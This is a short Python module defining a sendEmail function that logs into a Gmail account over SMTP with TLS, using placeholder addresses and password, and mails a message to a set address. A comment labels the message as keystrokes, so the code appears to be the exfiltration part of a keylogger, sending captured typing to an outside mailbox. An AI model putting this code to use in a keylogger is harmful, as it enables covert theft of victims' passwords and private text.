# Library for sending emails and secure connection
import smtplib, ssl

# Function for sending email
def sendEmail(message):
    smtp_server = "smtp.gmail.com" # SMTP server
    port = 587  # TLS encryption
    sender_email = "example123@gmail.com" # Replace this email with your own email
    password = "password123" # Replace this with your Gmail app password
    receiver_email = "example123@gmail.com" # Replace this email with your own email


    context = ssl.create_default_context()

    try:
        server = smtplib.SMTP(smtp_server,port) # Connecting to SMTP server
        server.ehlo()
        server.starttls(context=context)
        server.ehlo()

        # Logging into email account
        server.login(sender_email, password)

        #  Sending email with keystrokes
        server.sendmail(sender_email, receiver_email, message)

    # Handling errors
    except Exception as e:
        print(e)
    # Ending connection to server
    finally:
        server.quit()